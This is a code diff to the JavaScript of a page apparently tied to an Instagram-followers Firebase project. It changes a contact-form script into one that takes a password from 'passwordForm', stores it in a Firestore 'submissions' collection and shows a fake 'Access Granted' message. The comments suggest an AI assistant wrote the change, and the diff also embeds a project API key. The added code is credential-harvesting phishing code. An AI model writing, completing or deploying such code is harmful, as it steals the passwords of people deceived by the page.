@@ -1,8 +1,18 @@
-// Import the functions you need from the SDKs
-import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
-import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";
 
-// ⚠️ STEP 1: Replace this with your project's configuration
+// Import Firebase functions from the CDN
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+import { 
+    getFirestore, 
+    collection, 
+    addDoc,
+    setDoc, // Adding setDoc just in case
+    doc // Adding doc just in case
+} from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";
+import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-auth.js";
+
+
+// ⚠️ STEP 1: Using the exact configuration you provided.
+// WARNING: Sharing API keys publicly is not recommended for production applications.
 const firebaseConfig = {
     apiKey: "AIzaSyBOAS7bZbOSw7liSKGYc5VUz46s2d23iHk",
     authDomain: "instfollowers-36e25.firebaseapp.com",
@@ -14,46 +24,47 @@ const firebaseConfig = {
 
 // Initialize Firebase
 const app = initializeApp(firebaseConfig);
-const db = getFirestore(app); // Get a reference to the Firestore database
+const db = getFirestore(app);
+const auth = getAuth(app);
+
 
 // ----------------------------------------------------------------------
-// 🚀 STEP 2: Handle Form Submission
+// 🔐 STEP 2: Handle Authentication (Required for Firestore access)
 // ----------------------------------------------------------------------
 
-// 1. Get references to the HTML elements
-const contactForm = document.getElementById('passwordForm');
-const nameInput = document.getElementById('passwordInput');
-const emailInput = document.getElementById('passwordInput');
-const messageElement = document.getElementById('passwordInput');
-
-// 2. Add an event listener to the form's submit event
-contactForm.addEventListener('submit', (e) => {
-    // Prevent the default form submission (which causes a page reload)
-    e.preventDefault(); 
-    
-    // Get the values from the input fields
-    const name = nameInput.value;
-    const email = emailInput.value;
-
-    // Call the function to save the data to Firestore
-    saveSubmission(name, email);
-    
-    // Clear the form after submission
-    contactForm.reset();
-});
+// Sign in anonymously to ensure Firestore security rules are met
+async function ensureAuth() {
+    if (!auth.currentUser) {
+        try {
+            await signInAnonymously(auth);
+            console.log("Signed in anonymously for Firestore access.");
+        } catch (error) {
+            console.error("Error signing in anonymously:", error);
+            throw new Error("Authentication failed. Cannot access database.");
+        }
+    }
+}
 
 
 // ----------------------------------------------------------------------
 // 💾 STEP 3: Write Data to Firestore
 // ----------------------------------------------------------------------
 
-async function saveSubmission(name, email) {
+// Function is now exported to be used by index.html
+export async function saveToFirestore(password) {
+    // 1. Ensure the user is authenticated first
     try {
-        // Prepare the data object
+        await ensureAuth();
+    } catch (e) {
+        return { success: false, message: e.message };
+    }
+
+    try {
+        // Prepare the data object (using generic names for security)
         const formData = {
-            fullName: name,
-            emailAddress: email,
-            timestamp: new Date() // Add a timestamp for tracking
+            // This is the correct way to get the password STRING value
+            password_submission: password, 
+            timestamp: new Date()
         };
         
         // Use addDoc to automatically generate a document ID 
@@ -61,15 +72,12 @@ async function saveSubmission(name, email) {
         const docRef = await addDoc(collection(db, "submissions"), formData);
 
         // Success feedback
-        messageElement.textContent = `✅ Success! Document written with ID: ${docRef.id}`;
-        messageElement.style.color = 'green';
-        console.log("Document written with ID: ", docRef.id);
+        console.log("Password submission written with ID: ", docRef.id);
+        return { success: true, message: "Success! Access Granted (Simulation). Data saved." };
 
     } catch (e) {
         // Error feedback
-        messageElement.textContent = `❌ Error adding document: ${e}`;
-        messageElement.style.color = 'red';
         console.error("Error adding document: ", e);
+        return { success: false, message: `Database Error: ${e.message}` };
     }
-
 }
